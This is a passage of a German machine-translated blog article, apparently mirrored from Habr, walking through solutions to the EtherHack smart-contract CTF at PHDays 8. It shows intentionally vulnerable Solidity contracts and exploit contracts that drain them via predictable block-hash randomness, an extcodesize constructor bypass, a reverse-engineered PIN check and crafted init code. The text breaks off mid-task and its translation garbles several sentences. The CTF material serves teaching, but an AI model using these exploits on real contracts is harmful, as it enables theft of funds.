<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👁‍🗨 🤷🏻 🕘 Auffinden von Sicherheitslücken in intelligenten Verträgen: EtherHack-Überprüfung an positiven Hack-Tagen 8 👴 🏽 🤘🏻</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Jahr veranstalteten PHDays zum ersten Mal einen Wettbewerb namens EtherHack . Die Teilnehmer suchten nach Schwachstellen in intelligenten Ve...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Auffinden von Sicherheitslücken in intelligenten Verträgen: EtherHack-Überprüfung an positiven Hack-Tagen 8</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/414959/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/182/a00/fef/182a00fef4fbdd4677afb585de886e1e.jpg" alt="Bild"></a> <br><br>  In diesem Jahr veranstalteten <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PHDays</a> zum ersten Mal einen Wettbewerb namens <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">EtherHack</a> .  Die Teilnehmer suchten nach Schwachstellen in intelligenten Verträgen, um die Geschwindigkeit zu erhöhen.  In diesem Artikel informieren wir Sie über die Aufgaben des Wettbewerbs und mögliche Lösungsmöglichkeiten. <a name="habracut"></a><br><br><h2>  Azino 777 </h2><br><h4>  Gewinnen Sie die Lotterie und brechen Sie den Topf! </h4><br>  Die ersten drei Aufgaben betrafen Fehler bei der Generierung von Pseudozufallszahlen, über die wir kürzlich gesprochen haben: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Vorhersage von Zufallszahlen in intelligenten Ethereum-Verträgen</a> .  Die erste Aufgabe basierte auf einem Pseudozufallszahlengenerator (PRNG), der den Hash des letzten Blocks als Entropiequelle zur Erzeugung von Zufallszahlen verwendete: <br><br><pre><code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract Azino777 { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">//Generate random number between 0 &amp; max uint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399; function rand(uint max) constant private returns (uint256 result){ uint256 factor = FACTOR * 100 / max; uint256 lastBlockNumber = block.number - 1; uint256 hashVal = uint256(block.blockhash(lastBlockNumber)); return uint256((uint256(hashVal) / factor)) % max; } function() public payable {} }</span></span></code> </pre> <br>  Da das Ergebnis des Aufrufs der Funktion <code>block.blockhash(block.number-1)</code> für jede Transaktion innerhalb desselben Blocks dasselbe ist, kann der Angriff einen Exploit-Vertrag mit derselben Funktion <code>rand()</code> verwenden, um den Zielvertrag über eine interne Nachricht aufzurufen: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">WeakRandomAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = Azino777(_target); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); }</code> </pre> <br><h2>  Privat Ryan </h2><br><h4>  Wir haben einen privaten Anfangswert hinzugefügt, den niemand jemals berechnen wird. </h4><br>  Diese Aufgabe ist eine etwas komplizierte Version der vorherigen.  Die Seed-Variable, die als privat betrachtet wird, wird verwendet, um die Block-Ordnungszahl (block.number) zu versetzen, sodass der Hash des Blocks nicht vom vorherigen Block abhängt.  Nach jeder Wette wird der Startwert auf einen neuen „zufälligen“ Versatz umgeschrieben.  Zum Beispiel war es in der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Slotthereum-</a> Lotterie genau das. <br><br><pre> <code class="cpp hljs">contract PrivateRyan { uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyan</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br>  Wie in der vorherigen Aufgabe musste der Hacker nur die Funktion <code>rand()</code> in den Vertrags-Exploit kopieren. In diesem Fall musste der Wert der privaten Variablen seed außerhalb der Blockchain abgerufen und dann als Argument an den Exploit gesendet werden.  Dazu können Sie die Methode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">web3.eth.getStorageAt ()</a> aus der web3-Bibliothek verwenden: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f54/73b/748/f5473b74840e81cc2bef6c3105401777.png" alt="Bild"><br><br>  <i>Lesen Sie den Vertragsspeicher außerhalb der Blockchain, um den Anfangswert zu erhalten</i> <br><br>  Nach Erhalt des Anfangswertes muss dieser nur noch an den Exploit gesendet werden, der fast identisch mit dem in der ersten Aufgabe ist: <br><br><pre> <code class="cpp hljs">contract PrivateRyanAttack { PrivateRyan target; uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyanAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target, uint _seed)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = PrivateRyan(_target); seed = _seed; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br><h2>  Glücksrad </h2><br><h4>  Diese Lotterie verwendet den Hash des nachfolgenden Blocks.  Versuche es zu berechnen! </h4><br>  Bei dieser Aufgabe musste der Hash des Blocks ermittelt werden, dessen Nummer nach dem Platzieren der Wette in der Spielstruktur gespeichert wurde.  Dieser Hash wurde dann extrahiert, um nach der nächsten Wette eine Zufallszahl zu generieren. <br><br><pre> <code class="cpp hljs">Pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract WheelOfFortune { Game[] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> games; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Game</span></span></span><span class="hljs-class"> {</span></span> address player; uint id; uint bet; uint blockNumber; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 _bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint gameId = games.length; games.length++; games[gameId].id = gameId; games[gameId].player = msg.sender; games[gameId].bet = _bet; games[gameId].blockNumber = block.number; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (gameId &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { uint lastGameId = gameId - <span class="hljs-number"><span class="hljs-number">1</span></span>; uint num = rand(block.blockhash(games[lastGameId].blockNumber), <span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == games[lastGameId].bet) { games[lastGameId].player.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rand</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes32 hash, uint max)</span></span></span><span class="hljs-function"> pure </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 result)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> uint256(keccak256(hash)) % max; } function() <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> payable {} }</code> </pre><br>  In diesem Fall gibt es zwei mögliche Lösungen. <br><br><ol><li>  Rufen Sie den Zielvertrag zweimal über den Exploit-Vertrag auf.  Das Ergebnis des Aufrufs der Funktion block.blockhash (block.number) ist immer Null. </li><li>  Warten Sie, bis 256 Blöcke eingedrungen sind, und machen Sie eine zweite Wette.  Der gespeicherte Blocksequenznummern-Hash ist aufgrund der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Einschränkungen</a> der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Ethereum Virtual Machine (EVM)</a> für die Anzahl der verfügbaren Block-Hashes Null. </li></ol><br>  In beiden Fällen <code>uint256(keccak256(bytes32(0))) % 100</code> oder „47“. <br><br><h2>  Ruf mich vielleicht an </h2><br><h4>  Dieser Vertrag gefällt nicht, wenn andere Verträge ihn nennen. </h4><br>  Eine Möglichkeit, einen Vertrag vor dem Aufruf durch andere Verträge zu schützen, besteht darin, die Assembler-Anweisung EVM <code>extcodesize</code> , die die Größe des Vertrags an seine Adresse zurückgibt.  Die Methode besteht darin, diese Anweisung für die Adresse des Transaktionssenders mithilfe der Assembler-Einfügung zu verwenden.  Wenn das Ergebnis größer als Null ist, ist der Absender der Transaktion ein Vertrag, da normale Adressen in Ethereum keinen Code haben.  Genau dieser Ansatz wurde in dieser Aufgabe verwendet, um zu verhindern, dass andere Verträge den Vertrag aufrufen. <br><br><pre> <code class="cpp hljs">contract CallMeMaybe { <span class="hljs-function"><span class="hljs-function">modifier </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybe</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ uint32 size; address _addr = msg.sender; assembly { size := extcodesize(_addr) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); } _; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HereIsMyNumber</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> CallMeMaybe </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(tx.origin == msg.sender) { revert(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } function() payable {} }</code> </pre> <br>  Die Transaktionseigenschaft <code>tx.origin</code> verweist auf den ursprünglichen Ersteller der Transaktion und msg.sender auf den letzten Aufrufer.  Wenn wir die Transaktion von der üblichen Adresse senden, sind diese Variablen gleich und wir erhalten <code>revert()</code> .  Um unser Problem zu lösen, musste daher die Überprüfung des <code>extcodesize</code> <code>tx.origin</code> <code>msg.sender</code> , damit <code>tx.origin</code> und <code>msg.sender</code> unterschiedlich sind.  Glücklicherweise gibt es in EVM eine nette Funktion, die dabei helfen kann: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/9e9/07a/74e/9e907a74eb156cb8380527b50d47a4b8.png" alt="Bild"><br><br>  Wenn der gerade platzierte Vertrag einen anderen Vertrag im Konstruktor aufruft, existiert er selbst noch nicht in der Blockchain, sondern fungiert ausschließlich als Brieftasche.  Somit ist der Code nicht an den neuen Vertrag gebunden und extcodesize gibt Null zurück: <br><br><pre> <code class="cpp hljs"> contract CallMeMaybeAttack { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybeAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(CallMeMaybe _target)</span></span></span><span class="hljs-function"> payable </span></span>{ _target.HereIsMyNumber(); } function() payable {} }</code> </pre> <br><h2>  Das Schloss </h2><br><h4>  Seltsamerweise ist das Schloss geschlossen.  Versuchen Sie, den PIN-Code über die Entsperrfunktion (bytes4 pincode) abzurufen.  Jeder Freischaltversuch kostet 0,5 Äther. </h4><br>  Bei dieser Aufgabe erhielten die Teilnehmer keinen Code - sie mussten die Logik des Vertrags anhand seines Bytecodes wiederherstellen.  Eine Möglichkeit war die Verwendung von Radare2, einer Plattform, die zum <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Zerlegen</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Debuggen von EVMs verwendet wird</a> . <br><br>  Zu Beginn veröffentlichen wir ein Beispiel für die Zuweisung und geben den Code nach dem Zufallsprinzip ein: <br><br><pre> <code class="cpp hljs">await contract.unlock(<span class="hljs-string"><span class="hljs-string">"1337"</span></span>, {value: <span class="hljs-number"><span class="hljs-number">500000000000000000</span></span>}) →<span class="hljs-literal"><span class="hljs-literal">false</span></span></code> </pre> <br>  Der Versuch ist natürlich gut, aber erfolglos.  Versuchen Sie nun, diese Transaktion zu debuggen. <br><br><pre> <code class="cpp hljs">r2 -a evm -D evm <span class="hljs-string"><span class="hljs-string">"evm://localhost:8545@0xf7dd5ca9d18091d17950b5ecad5997eacae0a7b9cff45fba46c4d302cf6c17b7"</span></span></code> </pre> <br>  In diesem Fall weisen wir Radare2 an, die evm-Architektur zu verwenden.  Dieses Tool stellt dann eine Verbindung zum Ethereum-Knoten her und ruft die Ablaufverfolgung dieser Transaktion in der virtuellen Maschine ab.  Und jetzt sind wir endlich bereit, in den EVM-Bytecode einzutauchen. <br><br>  Zunächst müssen Sie eine Analyse durchführen: <br><br><pre> <code class="cpp hljs">[<span class="hljs-number"><span class="hljs-number">0x00000000</span></span>]&gt; aa [x] Analyze all flags starting with sym. <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">and</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">entry0</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(aa)</span></span></span></span></code> </pre> <br>  Als nächstes zerlegen wir die ersten 1000 Anweisungen (dies sollte ausreichen, um den gesamten Vertrag abzudecken) mit dem Befehl pd 1000 und wechseln zum Anzeigen des Diagramms mit dem Befehl VV. <br><br>  Bei EVM-Bytecode, der mit <code>solc</code> kompiliert wurde, steht normalerweise der Funktionsmanager an erster Stelle.  Basierend auf den ersten vier Bytes der <code>bytes4(sha3(function_name(params)))</code> die die Funktionssignatur enthalten, die als <code>bytes4(sha3(function_name(params)))</code> , entscheidet der Funktionsmanager, welche Funktion aufgerufen werden soll.  Wir interessieren uns für die <code>unlock(bytes4)</code> , die <code>0x75a4e3a0</code> . <br><br>  Nach dem Ausführungsablauf mit dem Schlüssel s gelangen wir zu dem Knoten, der die <code>callvalue</code> mit dem Wert <code>0x6f05b59d3b20000</code> oder <code>0x6f05b59d3b20000</code> vergleicht, was 0,5 Ether entspricht: <br><br><pre> <code class="cpp hljs">push8 <span class="hljs-number"><span class="hljs-number">0x6f05b59d3b20000</span></span> callvalue lt</code> </pre> <br>  Wenn der bereitgestellte Äther ausreicht, befinden wir uns in einem Knoten, der einer Kontrollstruktur ähnelt: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup4 push1 <span class="hljs-number"><span class="hljs-number">0xff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> lt iszero push2 <span class="hljs-number"><span class="hljs-number">0x1a4</span></span> jumpi</code> </pre> <br>  Der Code platziert den Wert 0x4 am oberen Rand des Stapels, überprüft die Obergrenze (der Wert sollte 0xff nicht überschreiten) und vergleicht ihn mit einem Wert, der vom vierten Element des Stapels (dup4) dupliziert wurde. <br><br>  Wenn wir zum Ende des Diagramms scrollen, sehen wir, dass dieses vierte Element im Wesentlichen ein Iterator ist und diese Kontrollstruktur eine Schleife ist, die <code>for(var i=0; i&lt;4; i++):</code> <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x1</span></span> add swap4</code> </pre> <br>  Wenn wir den Körper der Schleife betrachten, wird es offensichtlich, dass sie vier eingehende Bytes auflistet und einige Operationen mit jedem der Bytes ausführt.  Zunächst prüft die Schleife, ob das n-te Byte größer als 0x30 ist: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 lt iszero</code> </pre> <br>  und auch, dass dieser Wert kleiner als 0x39 ist: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x39</span></span> dup3 gt iszero</code> </pre> <br>  Dies ist im Wesentlichen eine Überprüfung, ob das angegebene Byte im Bereich von 0 bis 9 liegt. Wenn die Überprüfung erfolgreich ist, befinden wir uns im wichtigsten Codeblock: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/085/2d4/27b/0852d427bd50ab1d0da2fed5131dfac2.png" alt="Bild"><br><br>  Lassen Sie uns diesen Block in Teile zerlegen: <br><br>  1. Das dritte Element im Stapel ist der ASCII-Code des n-ten Bytes des Pin-Codes.  0x30 (ASCII-Code für Null) wird auf den Stapel geschoben und dann vom Code dieses Bytes subtrahiert: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 sub</code> </pre> <br>  Das heißt, <code>pincode[i] - 48</code> , und wir erhalten im Wesentlichen eine Ziffer aus dem ASCII-Code. Nennen wir es d. <br><br>  2. 0x4 wird zum Stapel hinzugefügt und als Exponent für das zweite Element im Stapel verwendet, d: <br><br><pre> <code class="cpp hljs">swap1 pop push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup2 <span class="hljs-built_in"><span class="hljs-built_in">exp</span></span></code> </pre> <br>  Das heißt, <code>d ** 4</code> . <br><br>  3. Das fünfte Element des Stapels wird abgerufen und das Ergebnis der Potenzierung hinzugefügt.  Nennen Sie diese Summe S: <br><br><pre> <code class="cpp hljs">dup5 add swap4 pop dup1</code> </pre> <br>  Das heißt, <code>S += d ** 4</code> . <br><br>  4. 0xa (ASCII-Code für 10) wird auf den Stapel geschoben und als Multiplikator für das siebte Element des Stapels verwendet (das vor dieser Addition das sechste war).  Wir wissen nicht, was es ist, deshalb werden wir dieses Element U nennen. Dann wird d zum Ergebnis der Multiplikation addiert: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0xa</span></span> dup7 mul add swap5 pop</code> </pre> <br>  Das heißt: <code>U = U * 10 + d</code> oder einfacher <code>([0x1, 0x3, 0x3, 0x7] → 1337)</code> dieser Ausdruck stellt den gesamten PIN-Code als Zahl aus einzelnen Bytes wieder her <code>([0x1, 0x3, 0x3, 0x7] → 1337)</code> . <br><br>  Das Schwierigste, was wir getan haben, ist, dass wir nach der Schleife zum Code übergehen. <br><br><pre> <code class="cpp hljs">dup5 dup5 eq</code> </pre> <br>  Wenn das fünfte und sechste Element auf dem Stapel gleich sind, führt uns der Ausführungsfluss zum Befehl sstore, der ein bestimmtes Flag im Vertragsspeicher setzt.  Da dies die einzige Sstore-Anweisung ist, haben wir anscheinend danach gesucht. <br><br>  Aber wie kommt man durch diesen Test?  Wie wir bereits herausgefunden haben, ist das fünfte Element auf dem Stapel S und das sechste U. Da S die Summe aller Ziffern des auf die vierte Potenz angehobenen PIN-Codes ist, benötigen wir einen PIN-Code, für den diese Bedingung erfüllt ist.  In unserem Fall ergab die Analyse, dass <code>1**4 + 3**4 + 3**4 + 7**4</code> nicht 1337 entspricht und wir nicht zur Anweisung des Gewinners <code>sstore</code> . <br><br>  Aber jetzt können wir eine Zahl berechnen, die die Bedingungen dieser Gleichung erfüllt.  Es gibt nur drei Zahlen, die als Summe ihrer Ziffern vierten Grades geschrieben werden können: 1634, 8208 und 9474. Jede von ihnen kann das Schloss öffnen! <br><br><h2>  Piratenschiff </h2><br><h4>  Hey Salag!  Ein Piratenschiff machte im Hafen fest.  Lassen Sie ihn vor Anker gehen und mit Jolly Roger die Flagge hissen und nach Schätzen suchen. </h4><br>  Der Standardkurs der Vertragsausführung umfasst drei Aktionen: <br><br><ol><li>  Ein Aufruf der Funktion <code>dropAnchor()</code> mit einer Blocknummer, die mehr als 100.000 Blöcke größer sein sollte als die aktuelle.  Die Funktion erstellt dynamisch einen Vertrag, bei dem es sich um einen "Anker" handelt, der mit <code>selfdestruct()</code> nach dem angegebenen Block "aufgehoben" werden <code>selfdestruct()</code> . </li><li>  Ein Aufruf der Funktion <code>pullAnchor()</code> , die <code>selfdestruct()</code> initiiert, wenn genügend Zeit vergangen ist (viel Zeit!). </li><li>  Rufen Sie sailAway () auf, wodurch <code>blackJackIsHauled</code> auf true gesetzt wird, wenn kein Ankervertrag besteht. </li></ol><br><pre> <code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.19</span></span>; contract PirateShip { address <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> anchor = <span class="hljs-number"><span class="hljs-number">0x0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> blackJackIsHauled = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sailAway</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ require(anchor != <span class="hljs-number"><span class="hljs-number">0x0</span></span>); address a = anchor; uint size = <span class="hljs-number"><span class="hljs-number">0</span></span>; assembly { size := extcodesize(a) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); <span class="hljs-comment"><span class="hljs-comment">// it is too early to sail away } blackJackIsHauled = true; // Yo Ho Ho! } function pullAnchor() public { require(anchor != 0x0); require(anchor.call()); // raise the anchor if the ship is ready to sail away } function dropAnchor(uint blockNumber) public returns(address addr) { // the ship will be able to sail away in 100k blocks time require(blockNumber &gt; block.number + 100000); // if(block.number &lt; blockNumber) { throw; } // suicide(msg.sender); uint[8] memory a; a[0] = 0x6300; // PUSH4 0x00... a[1] = blockNumber; // ...block number (3 bytes) a[2] = 0x43; // NUMBER a[3] = 0x10; // LT a[4] = 0x58; // PC a[5] = 0x57; // JUMPI a[6] = 0x33; // CALLER a[7] = 0xff; // SELFDESTRUCT uint code = assemble(a); // init code to deploy contract: stores it in memory and returns appropriate offsets uint[8] memory b; b[0] = 0; // allign b[1] = 0x6a; // PUSH11 b[2] = code; // contract b[3] = 0x6000; // PUSH1 0 b[4] = 0x52; // MSTORE b[5] = 0x600b; // PUSH1 11 ;; length b[6] = 0x6015; // PUSH1 21 ;; offset b[7] = 0xf3; // RETURN uint initcode = assemble(b); uint sz = getSize(initcode); uint offset = 32 - sz; assembly { let solidity_free_mem_ptr := mload(0x40) mstore(solidity_free_mem_ptr, initcode) addr := create(0, add(solidity_free_mem_ptr, offset), sz) } require(addr != 0x0); anchor = addr; } ///////////////// HELPERS ///////////////// function assemble(uint[8] chunks) internal pure returns(uint code) { for(uint i=chunks.length; i&gt;0; i--) { code ^= chunks[i-1] &lt;&lt; 8 * getSize(code); } } function getSize(uint256 chunk) internal pure returns(uint) { bytes memory b = new bytes(32); assembly { mstore(add(b, 32), chunk) } for(uint32 i = 0; i&lt; b.length; i++) { if(b[i] != 0) { return 32 - i; } } return 0; } }</span></span></code> </pre> <br>  Die Sicherheitsanfälligkeit liegt auf der Hand: Beim Erstellen eines Vertrags in der Funktion <code>dropAnchor()</code> Assembler-Anweisungen direkt <code>dropAnchor()</code> .  Die Hauptschwierigkeit bestand jedoch darin, eine Nutzlast zu erstellen, mit der wir die <code>block.number</code> . <br><br>  In EVM können Sie Verträge mit der Anweisung create erstellen.  Seine Argumente sind Wert, Eingabeversatz und Eingabegröße.  value ist ein Bytecode, der den Vertrag selbst hostet (Initialisierungscode).  In unserem Fall wird der Initialisierungscode + Vertragscode in uint256 abgelegt (danke an das <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">GasToken-</a> Team für die Idee): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x6a63004141414310585733ff600052600b6015f3</span></span></code> </pre> <br>  